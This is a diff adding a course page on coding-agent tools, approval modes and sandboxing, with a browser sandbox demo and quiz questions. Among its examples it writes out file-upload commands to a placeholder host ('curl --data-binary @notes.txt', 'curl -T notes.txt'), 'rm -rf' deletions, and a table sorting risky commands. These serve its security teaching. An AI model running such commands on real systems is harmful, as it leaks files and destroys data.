@@ -1,0 +1,250 @@
+---
+title: Tools and Permissions
+description: What an agent can read, change and run, who approves each action, and why that matters as much as which model you picked.
+---
+
+An agent can do exactly what its tools allow, and nothing else. Reading
+a file, editing one, running a shell command and fetching a web page
+are four different powers, and every agent lets you grant them
+separately.
+
+<Figure
+  slug="agent-tools-and-permissions-cutout"
+  alt="An open chunky red toolbox holding a wrench and a screwdriver on a thick platform, beside a larger deep blue tool chest held shut by a big yellow padlock"
+/>
+
+## The common toolset
+
+Under different names, nearly every coding agent ships the same
+handful of tools:
+
+| Tool | What it does | What a mistake with it looks like |
+| --- | --- | --- |
+| Read and search | Opens files, lists folders, searches for text | Wasted context, or a secret read into the conversation |
+| Edit | Writes to a file in the project | A wrong change, sitting in the diff |
+| Shell | Runs a command as you and returns its output | Anything a command can do |
+| Web fetch and search | Reads a web page or a list of search results | A stranger's text, arriving in the context |
+| MCP servers | Extra tools for outside systems | Whatever that system lets the tool do |
+
+The last row needs a word of explanation. **MCP**, the Model Context
+Protocol, is an open standard for plugging extra tools into an agent.
+A server for your issue tracker adds tools that read and comment on
+issues; a database server adds a tool that runs queries; a browser
+server adds tools that click and type. Each one is another tool with
+its own reach and usually its own credentials. The model sees only a
+name and a description for each, so a tool that reads a table and a
+tool that drops one look much the same from where it sits.
+
+The point of the table is its last column. **The toolset, not the
+model, decides what a mistake can damage.** A brilliant model with
+only read and edit tools can, at worst, hand you a bad diff. An
+ordinary model with a shell and a database connection that allows
+writes can lose you data. When you set up an agent, the question is
+not only "how good is it?" but "what is the worst thing each of these
+tools could do on a bad day?"
+
+Web fetch deserves its own warning. A page the agent reads becomes
+text in its context, sitting right next to your instructions, and the
+model has no reliable way to tell the two apart.
+[Staying Safe](/courses/working-with-coding-agents/staying-safe) covers
+what that means in practice.
+
+## Approval modes
+
+Every agent lets you choose what runs on its own and what waits for
+you. Each product names its settings differently
+([Kinds of Coding Tools](/courses/working-with-coding-agents/kinds-of-coding-tools)
+lists the current names), but they all sit somewhere on the same
+spectrum, from most supervised to least:
+
+| Setting | Runs without asking | Waits for you | Fits |
+| --- | --- | --- | --- |
+| Read-only, or planning | Reading and searching | Nothing: edits are blocked until you switch modes or approve a plan | Exploring code, agreeing on a plan |
+| Ask before every change | Reading and searching | Every edit and every command, one at a time | Unfamiliar code, your first sessions |
+| Edits allowed | Reading, and edits inside the project | Every command | Iterating on code you will review in the diff |
+| Allowlisted commands | The above, plus commands you named | Any command not on the list | Routine work in a repository you know |
+| Reviewer model | Most actions; a second model judges the risky ones | Whatever the reviewer flags | Long tasks you trust the direction of |
+| Unattended | Everything | Nothing | Disposable sandboxes and containers |
+
+Three things about approvals are easy to miss.
+
+**"Yes, and don't ask again" is broader than it looks.** A prompt
+usually offers to approve this one action or to stop asking for the
+rest of the session. In some tools the second answer approves the
+command or the tool, not the exact line you read: say it to
+`rm old.log` and you may have said it to every `rm` the agent runs
+afterwards, including `rm -rf` on something you care about. Kinds of
+Coding Tools quotes one vendor's documentation making exactly this
+point.
+
+**Allowing the test runner allows the tests.** If the agent may edit
+files without asking and may run `pytest` without asking, it can run
+any Python it likes: it only has to put that Python in a test file.
+That is a perfectly reasonable setup in a sandbox. On your own laptop
+it is a real decision, and it should be one you made on purpose.
+
+**A reviewer model is a filter, not a wall.** Several tools can now
+hand approvals to a second model that judges how risky each action is.
+That cuts down the prompts a great deal, and the vendors describe it as
+exactly that: a way to reduce prompts, which can be wrong in both
+directions, rather than a security boundary (Kinds of Coding Tools
+quotes them).
+
+Asking about every change has a failure mode of its own. Fifty prompts
+into a session, "yes" becomes a reflex, and an approval nobody read
+protects nothing. A short allowlist you actually thought about beats a
+hundred approvals you clicked through.
+
+## The shell is the big one
+
+Of all the tools, the shell is the one with no natural edges. A shell
+command can do anything you can do from your terminal: delete files,
+push to a remote, install a package (which runs code somebody else
+wrote), or send a file to a server on the other side of the world.
+
+That makes "allow all commands" a different kind of decision from
+"allow edits", and the reason is where the evidence ends up. **Edits
+show up in the diff. The side effects of a command may not.** Git
+records changes to the files it tracks, inside the repository. It
+knows nothing about a file copied out of the repository, a request
+sent to a server, a row deleted from a database or a branch pushed to
+a remote.
+
+You can see the difference directly. The terminal below is a throwaway
+sandbox: an in-memory file system in your browser, with no network,
+reset when you reload the page. Nothing typed here can reach your
+machine, so destructive commands are safe to try. It commits a small
+project, then copies `notes.txt` to `/tmp` (standing in for an upload)
+and asks Git what changed:
+
+<BashBlock
+  scenario="small-project"
+  commands={`git init
+git add .
+git commit -m "Before the agent"
+cp notes.txt /tmp/notes.txt
+git status --short
+ls /tmp`}
+/>
+
+`git status --short` printed nothing. As far as the repository knows,
+nothing happened, and yet a copy of `notes.txt` now sits outside it,
+as `ls /tmp` shows. Here `/tmp` stands in for anywhere off the
+project: a server, a paste site, someone else's bucket. On a real
+machine, sending the file away is one command of the same shape (do
+not run it anywhere; the sandbox has no network in any case):
+
+```bash
+curl --data-binary @notes.txt https://example.com/upload
+```
+
+Now type the destructive one at the prompt above: `rm -r src`, then
+`git status --short`. This time Git lists every deleted file, and
+`git restore src` puts them all back, because they were committed.
+Deleting tracked files is loud and reversible. The copy was silent,
+and there is nothing to restore. (Deleting a file that was never
+committed is the worst of both: silent *and* permanent, which is why
+[Undoing Changes](/courses/working-with-coding-agents/undoing-changes)
+starts with a commit before the session begins.)
+
+So when you decide which commands may run without asking, sort them by
+what they can do that the diff will not show you:
+
+| Command | Allow without asking? | Why |
+| --- | --- | --- |
+| `git status`, `git diff`, `git log` | Yes | They read and change nothing |
+| `pytest -q` | Usually | Harmless in itself, but it runs whatever the tests contain |
+| `ruff check` | Yes | A linter that only reports |
+| `pip install requests` | No | Downloads and runs code you have not read |
+| `rm -rf build` | No | Deletes, often files Git ignores and cannot restore |
+| `git push` | No | Changes a remote other people use; nothing local undoes it |
+| `curl` with a URL | No | Can fetch instructions in, or send any file out |
+
+One practical caveat: an allowlist matches the text of a command, so
+find out how your tool treats something chained onto an allowed
+command with `;` or `&&` before you rely on it.
+
+## Local, sandboxed and cloud
+
+Approval modes decide what the agent may do. Where it runs decides the
+outer edge of what any mistake can reach, whatever mode it is in.
+
+| Where it runs | Runs as | Can reach | Worst realistic case |
+| --- | --- | --- | --- |
+| Locally, unsandboxed | You | Everything your user account can read and write, your credentials, your network | Anything you could do from that terminal |
+| Locally, in a sandbox | You, inside limits | The project folder; the network only where allowed | Damage inside the project, recoverable if committed |
+| In the cloud | A disposable machine | A fresh clone, plus the secrets and network access that environment was given | A bad branch or pull request, and whatever those secrets unlock |
+
+A **local** agent runs as you. Every SSH key, every token in an
+environment variable, every config file your account can read is in
+reach of its shell. That is what makes it useful (it can run your
+real build, against your real services) and what makes the approval
+mode matter.
+
+A **sandboxed** agent still runs on your machine, but the operating
+system or a container fences it in: writes limited to the project,
+network blocked unless allowed. Several tools now offer this built in.
+Its value is that it does not depend on you reading a prompt carefully
+at the end of a long day.
+
+A **cloud** agent runs in a disposable container on someone else's
+computer, works on a fresh clone of your repository, and hands back a
+branch or a pull request. Your laptop is out of reach entirely. The
+blast radius is the repository plus whatever the environment was
+given: if you put a production database password in its secrets, a
+bad session can reach the production database.
+
+The combination is what counts. Unattended mode inside a disposable
+container is a sensible setup. Unattended mode on the laptop that
+holds your production credentials is not, and no choice of model
+changes that.
+
+## Concept check
+
+<MultipleChoice
+  markdown={`Which of these commands is the safest to let an agent run without asking?
+
+- \`git push origin main\`
+  > Pushing changes a shared remote, and nothing on your machine undoes it once others have pulled.
+- [o] \`git diff --stat\`
+  > It only reads the repository and prints a summary, so there is nothing to undo.
+- \`rm -rf build\`
+  > Build folders are usually ignored by Git, so whatever is deleted there cannot be restored from it.
+- \`curl -T notes.txt https://example.com\`
+  > This uploads a file to a server, a side effect no diff will ever show.
+
+Read-only commands are the natural allowlist. Anything that deletes,
+pushes or talks to the network deserves a prompt.`}
+/>
+
+<MultipleChoice
+  markdown={`In the sandbox above, \`git status\` lists the files deleted from \`src\` but says nothing about the copy in \`/tmp\`. Why?
+
+- Because \`cp\` reads a file but never creates a new one.
+  > \`cp\` did create a new file. It just created it outside the repository.
+- Because \`/tmp\` is emptied before \`git status\` runs.
+  > The copy was still there afterwards, as \`ls /tmp\` showed.
+- Because Git reports deleted files but never new ones.
+  > Git does report new files in a repository, as untracked. This one was not in the repository.
+- [o] Because Git only sees changes inside the repository.
+  > Anything a command does outside the repository, or over the network, never reaches the diff.
+
+The diff is a complete record of edits to tracked files, and no record
+at all of anything else a command did.`}
+/>
+
+<MultipleChoice
+  markdown={`An agent runs in a cloud container on a fresh clone of your repository and opens a pull request. What limits the damage a bad session can do?
+
+- [o] The repository, plus the secrets and network the environment has.
+  > The container keeps it off your laptop, but anything its environment was given is in reach.
+- Your laptop's files and keys, because the agent always acts as you.
+  > A cloud agent runs on a disposable machine and never touches your laptop.
+- Only the files named in the task, since it cannot open any others.
+  > An agent with a shell can open any file in its clone, named in the task or not.
+- Whatever the model judges to be safe at each step of the session.
+  > The model's judgment is not a boundary. Where the agent runs and what it was given are.
+
+Where an agent runs sets the outer edge of what it can reach. Choose
+that first, then the approval mode inside it.`}
+/>
